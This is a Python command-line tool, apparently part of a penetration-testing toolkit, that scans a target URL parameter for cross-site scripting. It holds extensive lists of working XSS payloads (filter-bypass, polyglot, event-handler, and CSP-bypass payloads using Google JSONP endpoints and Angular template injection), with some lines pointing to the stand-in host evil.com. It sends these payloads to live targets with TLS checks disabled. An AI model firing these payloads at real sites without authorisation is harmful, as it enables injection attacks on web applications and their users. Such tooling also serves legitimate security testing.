"""
Advanced XSS Testing Wrapper - Tests for DOM-based, Reflected, Stored XSS
and CSP bypass techniques
"""
import sys
import argparse
import json
import requests
import re
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from urllib.parse import urlparse, parse_qs, urlencode, quote

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import InjectionTool


class XSSType(Enum):
    """Types of XSS vulnerabilities"""
    REFLECTED = "reflected"
    DOM = "dom"
    STORED = "stored"
    CSP_BYPASS = "csp_bypass"


class XSSContext(Enum):
    """Context where XSS payload appears"""
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT = "javascript"
    URL = "url"
    CSS = "css"
    HTML_COMMENT = "html_comment"


@dataclass
class XSSFinding:
    """Represents an XSS finding"""
    payload: str
    payload_type: str
    xss_type: str
    context: Optional[str]
    reflected: bool
    status_code: int
    response_length: int
    potential_vuln: bool
    evidence: Optional[str] = None
    csp_header: Optional[str] = None


class AdvancedXSSTester(InjectionTool):
    """Advanced XSS testing wrapper with DOM and CSP bypass capabilities"""

    # Basic reflected XSS payloads
    REFLECTED_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe onload=alert(1)>",
        "javascript:alert(1)",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "'><script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "</script><script>alert(1)</script>",
    ]

    # DOM-based XSS payloads
    DOM_PAYLOADS = [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<script>alert(1)</script>",
        "'-alert(1)-'",
        "\";alert(1)//",
        "</script><script>alert(1)</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg/onload=alert(1)>",
        "'-alert(1)-'",
        "\\'-alert(1)//",
        "#<script>alert(1)</script>",
        "#javascript:alert(1)",
    ]

    # CSP bypass payloads
    CSP_BYPASS_PAYLOADS = [
        # JSONP bypass
        "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>",
        "<script src='https://www.google.com/complete/search?client=chrome&jsonp=alert(1)//'></script>",
        # Angular bypass
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        # Base tag injection
        "<base href='https://evil.com'>",
        # Object data
        "<object data='javascript:alert(1)'>",
        # SVG with use element
        "<svg><use href='data:image/svg+xml,<svg id=\"x\" xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>#x'></use></svg>",
        # Iframe srcdoc
        "<iframe srcdoc='<script>alert(1)</script>'>",
        # Meta refresh
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        # Link preload
        "<link rel=prefetch href='//evil.com'>",
    ]

    # Event handler payloads
    EVENT_HANDLER_PAYLOADS = [
        "' onmouseover='alert(1)'",
        "\" onfocus=\"alert(1)\" autofocus",
        "' onclick='alert(1)'",
        "\" onload=\"alert(1)\"",
        "' onerror='alert(1)'",
        "\" onmouseenter=\"alert(1)\"",
        "' onfocusin='alert(1)'",
        "\" onanimationend=\"alert(1)\"",
        "' ontransitionend='alert(1)'",
        "\" onwheel=\"alert(1)\"",
    ]

    # Filter bypass payloads
    FILTER_BYPASS_PAYLOADS = [
        # Case manipulation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<IMG SRC=x OnErRoR=alert(1)>",
        # Null bytes
        "<scr\x00ipt>alert(1)</script>",
        "<img src=x onerror\x00=alert(1)>",
        # HTML encoding
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        # Unicode escapes
        "<script>\\u0061lert(1)</script>",
        # Octal encoding
        "<script>\\141lert(1)</script>",
        # Without spaces
        "<svg/onload=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        # Using / instead of space
        "<svg/onload=alert(1)//",
        # Tab, newline, carriage return
        "<img\tsrc=x\tonerror=alert(1)>",
        "<img\nsrc=x\nonerror=alert(1)>",
        "<img\rsrc=x\ronerror=alert(1)>",
        # Double encoding
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    ]

    # Polyglot payloads (work in multiple contexts)
    POLYGLOT_PAYLOADS = [
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\"-->]]>*/</script></style></title></textarea></noscript></template></option></select><!--<script>alert(1)</script>-->",
        "'-alert(1)-'",
        "<svg/onload=alert(1)>",
    ]

    # Context-specific payloads
    CONTEXT_PAYLOADS = {
        XSSContext.HTML_ATTRIBUTE: [
            "\" onfocus=\"alert(1)\" autofocus=\"",
            "' onfocus='alert(1)' autofocus='",
            "\" onmouseover=\"alert(1)\" a=\"",
            "javascript:alert(1)",
        ],
        XSSContext.JAVASCRIPT: [
            "';alert(1)//",
            "\";alert(1)//",
            "</script><script>alert(1)</script>",
            "\\';alert(1)//",
            "'-alert(1)-'",
        ],
        XSSContext.URL: [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "//evil.com/xss.js",
        ],
        XSSContext.CSS: [
            "expression(alert(1))",
            "url(javascript:alert(1))",
            "behavior:url(xss.htc)",
        ],
    }

    # DOM sources and sinks for DOM XSS detection
    DOM_SOURCES = [
        'location', 'location.href', 'location.hash', 'location.search',
        'location.pathname', 'document.URL', 'document.documentURI',
        'document.referrer', 'window.name', 'document.cookie',
        'localStorage', 'sessionStorage'
    ]

    DOM_SINKS = [
        'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
        'eval', 'setTimeout', 'setInterval', 'execScript', 'Function',
        'element.src', 'element.href', 'element.action', 'element.onclick',
        'jQuery.html', '$.html', 'element.insertAdjacentHTML'
    ]

    @property
    def tool_name(self) -> str:
        return "advanced_xss"

    def _build_target_args(self, target: str, **kwargs) -> list:
        """Advanced XSS doesn't use CLI - this returns empty"""
        return []

    def check_tool_installed(self) -> bool:
        """Override - this tool is pure Python"""
        try:
            import requests
            return True
        except ImportError:
            return False

    def test_reflected_xss(self, url: str, param_name: str, method: str = 'GET',
                           headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                           timeout: int = 10) -> List[XSSFinding]:
        """Test for reflected XSS vulnerabilities."""
        findings = []

        all_payloads = (self.REFLECTED_PAYLOADS + self.EVENT_HANDLER_PAYLOADS +
                       self.FILTER_BYPASS_PAYLOADS + self.POLYGLOT_PAYLOADS)

        for payload in all_payloads:
            finding = self._test_payload(
                url, param_name, payload, method, headers, cookies, timeout,
                xss_type=XSSType.REFLECTED.value
            )
            findings.append(finding)

        return findings

    def test_dom_xss(self, url: str, param_name: str,
                     headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                     timeout: int = 10) -> List[XSSFinding]:
        """Test for DOM-based XSS vulnerabilities."""
        findings = []

        for payload in self.DOM_PAYLOADS:
            finding = self._test_payload(
                url, param_name, payload, 'GET', headers, cookies, timeout,
                xss_type=XSSType.DOM.value
            )
            findings.append(finding)

        # Also test hash-based payloads
        for payload in self.DOM_PAYLOADS:
            # Test with payload in URL fragment
            hash_finding = self._test_hash_payload(
                url, payload, headers, cookies, timeout
            )
            findings.append(hash_finding)

        return findings

    def test_csp_bypass(self, url: str, param_name: str,
                        headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                        timeout: int = 10) -> Dict[str, Any]:
        """Test CSP bypass techniques."""
        results = {
            'csp_present': False,
            'csp_header': None,
            'bypass_possible': False,
            'tests': []
        }

        # First check CSP header
        try:
            response = requests.get(url, headers=headers, cookies=cookies,
                                   timeout=timeout, verify=False)
            csp_header = response.headers.get('Content-Security-Policy', '')
            csp_report = response.headers.get('Content-Security-Policy-Report-Only', '')

            results['csp_present'] = bool(csp_header or csp_report)
            results['csp_header'] = csp_header or csp_report

            # Analyze CSP for weaknesses
            if csp_header:
                results['csp_analysis'] = self._analyze_csp(csp_header)
        except Exception as e:
            results['error'] = str(e)
            return results

        # Test CSP bypass payloads
        for payload in self.CSP_BYPASS_PAYLOADS:
            try:
                finding = self._test_payload(
                    url, param_name, payload, 'GET', headers, cookies, timeout,
                    xss_type=XSSType.CSP_BYPASS.value
                )
                finding.csp_header = results['csp_header']
                results['tests'].append({
                    'payload': payload,
                    'reflected': finding.reflected,
                    'status_code': finding.status_code,
                    'potential_bypass': finding.potential_vuln
                })

                if finding.potential_vuln:
                    results['bypass_possible'] = True
            except Exception:
                continue

        return results

    def detect_context(self, url: str, param_name: str, method: str = 'GET',
                       headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                       timeout: int = 10) -> Dict[str, Any]:
        """Detect the context where input is reflected."""
        # Use a unique identifier to find reflection
        probe = f"XSSPROBE{hash(url) % 10000}ENDPROBE"

        try:
            if method.upper() == 'GET':
                response = requests.get(
                    url, params={param_name: probe},
                    headers=headers, cookies=cookies,
                    timeout=timeout, verify=False
                )
            else:
                response = requests.post(
                    url, data={param_name: probe},
                    headers=headers, cookies=cookies,
                    timeout=timeout, verify=False
                )

            if probe not in response.text:
                return {'reflected': False, 'context': None}

            # Analyze context
            context = self._determine_context(response.text, probe)

            return {
                'reflected': True,
                'context': context,
                'count': response.text.count(probe),
                'recommended_payloads': self.CONTEXT_PAYLOADS.get(
                    XSSContext(context), self.REFLECTED_PAYLOADS[:5]
                ) if context else None
            }
        except Exception as e:
            return {'error': str(e)}

    def test_context_specific(self, url: str, param_name: str, context: str,
                              method: str = 'GET', headers: Optional[Dict] = None,
                              cookies: Optional[Dict] = None, timeout: int = 10) -> List[XSSFinding]:
        """Test with context-specific payloads."""
        findings = []

        try:
            context_enum = XSSContext(context)
            payloads = self.CONTEXT_PAYLOADS.get(context_enum, self.REFLECTED_PAYLOADS)
        except ValueError:
            payloads = self.REFLECTED_PAYLOADS

        for payload in payloads:
            finding = self._test_payload(
                url, param_name, payload, method, headers, cookies, timeout,
                xss_type=XSSType.REFLECTED.value
            )
            finding.context = context
            findings.append(finding)

        return findings

    def scan_dom_sources_sinks(self, url: str, headers: Optional[Dict] = None,
                                cookies: Optional[Dict] = None,
                                timeout: int = 10) -> Dict[str, Any]:
        """Scan JavaScript for DOM XSS sources and sinks."""
        results = {
            'sources_found': [],
            'sinks_found': [],
            'potential_dom_xss': False,
            'js_files': []
        }

        try:
            # Get the main page
            response = requests.get(url, headers=headers, cookies=cookies,
                                   timeout=timeout, verify=False)

            # Extract JavaScript from page
            js_content = self._extract_inline_js(response.text)

            # Check for sources and sinks in inline JS
            for source in self.DOM_SOURCES:
                if source in js_content:
                    results['sources_found'].append({
                        'source': source,
                        'location': 'inline'
                    })

            for sink in self.DOM_SINKS:
                if sink in js_content:
                    results['sinks_found'].append({
                        'sink': sink,
                        'location': 'inline'
                    })

            # Find external JS files
            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', response.text)
            results['js_files'] = js_urls

            # Analyze external JS files
            for js_url in js_urls[:10]:  # Limit to 10 files
                if not js_url.startswith('http'):
                    parsed = urlparse(url)
                    if js_url.startswith('//'):
                        js_url = f"{parsed.scheme}:{js_url}"
                    elif js_url.startswith('/'):
                        js_url = f"{parsed.scheme}://{parsed.netloc}{js_url}"
                    else:
                        js_url = f"{parsed.scheme}://{parsed.netloc}/{js_url}"

                try:
                    js_response = requests.get(js_url, headers=headers,
                                              timeout=timeout, verify=False)
                    js_text = js_response.text

                    for source in self.DOM_SOURCES:
                        if source in js_text:
                            results['sources_found'].append({
                                'source': source,
                                'location': js_url
                            })

                    for sink in self.DOM_SINKS:
                        if sink in js_text:
                            results['sinks_found'].append({
                                'sink': sink,
                                'location': js_url
                            })
                except Exception:
                    continue

            # Determine if DOM XSS is potentially possible
            if results['sources_found'] and results['sinks_found']:
                results['potential_dom_xss'] = True

        except Exception as e:
            results['error'] = str(e)

        return results

    def _test_payload(self, url: str, param_name: str, payload: str,
                      method: str, headers: Optional[Dict], cookies: Optional[Dict],
                      timeout: int, xss_type: str = 'reflected') -> XSSFinding:
        """Send request with XSS payload."""
        try:
            if method.upper() == 'GET':
                response = requests.get(
                    url,
                    params={param_name: payload},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )
            else:
                response = requests.post(
                    url,
                    data={param_name: payload},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )

            reflected = payload in response.text
            context = self._determine_context(response.text, payload) if reflected else None
            vuln_detected = reflected and not self._is_encoded_or_escaped(response.text, payload)

            return XSSFinding(
                payload=payload,
                payload_type=self._get_payload_type(payload),
                xss_type=xss_type,
                context=context,
                reflected=reflected,
                status_code=response.status_code,
                response_length=len(response.text),
                potential_vuln=vuln_detected,
                evidence=self._extract_evidence(response.text, payload) if vuln_detected else None
            )

        except requests.exceptions.Timeout:
            return XSSFinding(
                payload=payload,
                payload_type=self._get_payload_type(payload),
                xss_type=xss_type,
                context=None,
                reflected=False,
                status_code=0,
                response_length=0,
                potential_vuln=False,
                evidence='Request timed out'
            )
        except Exception as e:
            return XSSFinding(
                payload=payload,
                payload_type=self._get_payload_type(payload),
                xss_type=xss_type,
                context=None,
                reflected=False,
                status_code=0,
                response_length=0,
                potential_vuln=False,
                evidence=str(e)
            )

    def _test_hash_payload(self, url: str, payload: str,
                           headers: Optional[Dict], cookies: Optional[Dict],
                           timeout: int) -> XSSFinding:
        """Test payload in URL hash (fragment)."""
        try:
            # Make request to URL (hash isn't sent to server)
            response = requests.get(
                url, headers=headers, cookies=cookies,
                timeout=timeout, verify=False
            )

            # Check if page has JavaScript that processes hash
            has_hash_processing = any(source in response.text for source in
                                       ['location.hash', 'window.location.hash'])

            return XSSFinding(
                payload=f"#{payload}",
                payload_type='dom_hash',
                xss_type=XSSType.DOM.value,
                context='url_hash',
                reflected=False,  # Hash isn't reflected in response
                status_code=response.status_code,
                response_length=len(response.text),
                potential_vuln=has_hash_processing,
                evidence='Page processes URL hash' if has_hash_processing else None
            )
        except Exception as e:
            return XSSFinding(
                payload=f"#{payload}",
                payload_type='dom_hash',
                xss_type=XSSType.DOM.value,
                context=None,
                reflected=False,
                status_code=0,
                response_length=0,
                potential_vuln=False,
                evidence=str(e)
            )

    def _determine_context(self, html: str, value: str) -> Optional[str]:
        """Determine the context where value appears in HTML."""
        if value not in html:
            return None

        # Find position of value
        pos = html.find(value)
        before = html[max(0, pos-100):pos]
        after = html[pos:pos+len(value)+100]

        # Check various contexts
        if re.search(r'<script[^>]*>[^<]*$', before, re.IGNORECASE):
            return XSSContext.JAVASCRIPT.value

        if re.search(r'=["\'][^"\']*$', before):
            return XSSContext.HTML_ATTRIBUTE.value

        if re.search(r'<style[^>]*>[^<]*$', before, re.IGNORECASE):
            return XSSContext.CSS.value

        if re.search(r'<!--[^>]*$', before):
            return XSSContext.HTML_COMMENT.value

        if re.search(r'href=["\'][^"\']*$', before, re.IGNORECASE):
            return XSSContext.URL.value

        return XSSContext.HTML_BODY.value

    def _is_encoded_or_escaped(self, html: str, payload: str) -> bool:
        """Check if payload is encoded or escaped."""
        # Check if HTML entities are used
        encoded_versions = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('<', '&#60;').replace('>', '&#62;'),
            payload.replace('"', '&quot;'),
            payload.replace("'", '&#39;'),
            quote(payload),
        ]

        for encoded in encoded_versions:
            if encoded in html and payload not in html:
                return True

        return False

    def _extract_evidence(self, html: str, payload: str, context_size: int = 100) -> str:
        """Extract evidence showing payload in context."""
        pos = html.find(payload)
        if pos == -1:
            return ""

        start = max(0, pos - context_size)
        end = min(len(html), pos + len(payload) + context_size)

        return html[start:end]

    def _get_payload_type(self, payload: str) -> str:
        """Categorize payload type."""
        if '<script' in payload.lower():
            return 'script_tag'
        if 'onerror' in payload.lower() or 'onload' in payload.lower():
            return 'event_handler'
        if 'javascript:' in payload.lower():
            return 'javascript_uri'
        if '<svg' in payload.lower():
            return 'svg'
        if '<img' in payload.lower():
            return 'img_tag'
        if '{{' in payload:
            return 'template_injection'
        return 'other'

    def _analyze_csp(self, csp: str) -> Dict[str, Any]:
        """Analyze CSP header for weaknesses."""
        analysis = {
            'has_unsafe_inline': "'unsafe-inline'" in csp,
            'has_unsafe_eval': "'unsafe-eval'" in csp,
            'has_wildcard': "* " in csp or " *" in csp or csp.startswith("*"),
            'allows_data_uri': "data:" in csp,
            'weaknesses': []
        }

        if analysis['has_unsafe_inline']:
            analysis['weaknesses'].append("'unsafe-inline' allows inline scripts")
        if analysis['has_unsafe_eval']:
            analysis['weaknesses'].append("'unsafe-eval' allows eval()")
        if analysis['has_wildcard']:
            analysis['weaknesses'].append("Wildcard (*) allows loading from any source")
        if analysis['allows_data_uri']:
            analysis['weaknesses'].append("data: URIs may allow XSS")
        if 'script-src' not in csp:
            analysis['weaknesses'].append("No script-src directive (falls back to default-src)")

        return analysis

    def _extract_inline_js(self, html: str) -> str:
        """Extract inline JavaScript from HTML."""
        js_content = ""
        script_tags = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL | re.IGNORECASE)
        js_content = '\n'.join(script_tags)

        # Also get event handlers
        event_handlers = re.findall(r'on\w+=["\']([^"\']+)["\']', html, re.IGNORECASE)
        js_content += '\n' + '\n'.join(event_handlers)

        return js_content

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Run advanced XSS tests."""
        from datetime import datetime

        self.start_time = datetime.now()

        param_name = kwargs.get('param', 'q')
        method = kwargs.get('method', 'GET')
        headers = kwargs.get('headers')
        cookies = kwargs.get('cookies')
        test_dom = kwargs.get('test_dom', True)
        test_csp = kwargs.get('test_csp', True)
        detect_context = kwargs.get('detect_context', True)
        timeout = kwargs.get('timeout', 10)

        all_findings = []
        csp_results = None
        context_info = None
        dom_analysis = None

        print(f"[*] Testing advanced XSS on {target}")
        print(f"[*] Parameter: {param_name}, Method: {method}")

        # Detect context first
        if detect_context:
            print("[*] Detecting injection context...")
            context_info = self.detect_context(
                url=target, param_name=param_name, method=method,
                headers=headers, cookies=cookies, timeout=timeout
            )

        # Standard reflected XSS tests
        print("[*] Running reflected XSS tests...")
        reflected_findings = self.test_reflected_xss(
            url=target, param_name=param_name, method=method,
            headers=headers, cookies=cookies, timeout=timeout
        )
        all_findings.extend(reflected_findings)

        # DOM XSS tests
        if test_dom:
            print("[*] Running DOM XSS tests...")
            dom_findings = self.test_dom_xss(
                url=target, param_name=param_name,
                headers=headers, cookies=cookies, timeout=timeout
            )
            all_findings.extend(dom_findings)

            print("[*] Scanning for DOM sources and sinks...")
            dom_analysis = self.scan_dom_sources_sinks(
                url=target, headers=headers, cookies=cookies, timeout=timeout
            )

        # CSP bypass tests
        if test_csp:
            print("[*] Running CSP bypass tests...")
            csp_results = self.test_csp_bypass(
                url=target, param_name=param_name,
                headers=headers, cookies=cookies, timeout=timeout
            )

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        # Filter vulnerable findings
        vulnerable = [f for f in all_findings if f.potential_vuln]

        # Save results
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"advanced_xss_{timestamp}.json"

        results = {
            'target': target,
            'parameter': param_name,
            'method': method,
            'total_tests': len(all_findings),
            'vulnerable_count': len(vulnerable),
            'context_info': context_info,
            'csp_results': csp_results,
            'dom_analysis': dom_analysis,
            'findings': [
                {
                    'payload': f.payload,
                    'payload_type': f.payload_type,
                    'xss_type': f.xss_type,
                    'context': f.context,
                    'reflected': f.reflected,
                    'status_code': f.status_code,
                    'response_length': f.response_length,
                    'potential_vuln': f.potential_vuln,
                    'evidence': f.evidence
                }
                for f in all_findings
            ]
        }

        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to: {output_file}")

        return {
            'success': True,
            'tool': self.tool_name,
            'target': target,
            'duration': duration,
            'output_file': str(output_file),
            'results': all_findings,
            'context_info': context_info,
            'csp_results': csp_results,
            'dom_analysis': dom_analysis,
            'vulnerable_count': len(vulnerable)
        }


def main():
    parser = argparse.ArgumentParser(
        description="Advanced XSS Tester - Test for reflected, DOM-based XSS and CSP bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python advanced_xss.py -u "https://example.com/search" -p query
  python advanced_xss.py -u "https://example.com/page" -p name --method POST
  python advanced_xss.py -u "https://example.com/app" -p input --test-dom
  python advanced_xss.py -u "https://example.com/api" -p data --test-csp
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", default="q", help="Parameter to test (default: q)")
    parser.add_argument("-m", "--method", default="GET", choices=['GET', 'POST'],
                       help="HTTP method (default: GET)")
    parser.add_argument("--test-dom", action="store_true", default=True,
                       help="Test for DOM XSS (default: enabled)")
    parser.add_argument("--no-dom", action="store_true",
                       help="Disable DOM XSS testing")
    parser.add_argument("--test-csp", action="store_true", default=True,
                       help="Test CSP bypass (default: enabled)")
    parser.add_argument("--no-csp", action="store_true",
                       help="Disable CSP bypass testing")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                       help="Custom header (format: 'Name: Value')")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Output file path")

    args = parser.parse_args()

    # Parse headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ':' in h:
                name, value = h.split(':', 1)
                headers[name.strip()] = value.strip()

    # Parse cookies
    cookies = None
    if args.cookie:
        cookies = {}
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies[name.strip()] = value.strip()

    tester = AdvancedXSSTester()

    result = tester.run(
        target=args.url,
        param=args.param,
        method=args.method,
        test_dom=not args.no_dom,
        test_csp=not args.no_csp,
        headers=headers if headers else None,
        cookies=cookies,
        timeout=args.timeout,
        output_file=args.output
    )

    # Print summary
    print(f"\n{'='*60}")
    print(f"Advanced XSS Test Results")
    print(f"{'='*60}")
    print(f"Target: {args.url}")
    print(f"Parameter: {args.param}")
    print(f"Total Tests: {len(result['results'])}")
    print(f"Potential Vulnerabilities: {result['vulnerable_count']}")

    # Context info
    if result.get('context_info') and result['context_info'].get('reflected'):
        print(f"\n[*] Input is reflected in: {result['context_info'].get('context', 'unknown')} context")

    # CSP info
    if result.get('csp_results'):
        csp = result['csp_results']
        if csp.get('csp_present'):
            print(f"\n[*] CSP Header Present: Yes")
            if csp.get('csp_analysis', {}).get('weaknesses'):
                print("[!] CSP Weaknesses:")
                for weakness in csp['csp_analysis']['weaknesses']:
                    print(f"    - {weakness}")
        else:
            print(f"\n[*] CSP Header Present: No")

    # DOM analysis
    if result.get('dom_analysis') and result['dom_analysis'].get('potential_dom_xss'):
        print(f"\n[!] Potential DOM XSS detected!")
        print(f"    Sources found: {len(result['dom_analysis'].get('sources_found', []))}")
        print(f"    Sinks found: {len(result['dom_analysis'].get('sinks_found', []))}")

    # Vulnerable findings
    if result['vulnerable_count'] > 0:
        print(f"\n[!] POTENTIAL XSS VULNERABILITIES FOUND!")
        for finding in result['results']:
            if finding.potential_vuln:
                print(f"\n  Payload: {finding.payload[:80]}...")
                print(f"  Type: {finding.xss_type} ({finding.payload_type})")
                print(f"  Context: {finding.context}")
                print(f"  Reflected: {finding.reflected}")
                if finding.evidence:
                    print(f"  Evidence: {finding.evidence[:150]}...")
    else:
        print("\n[+] No XSS vulnerabilities detected")

    return 0 if result['success'] else 1


if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    sys.exit(main())
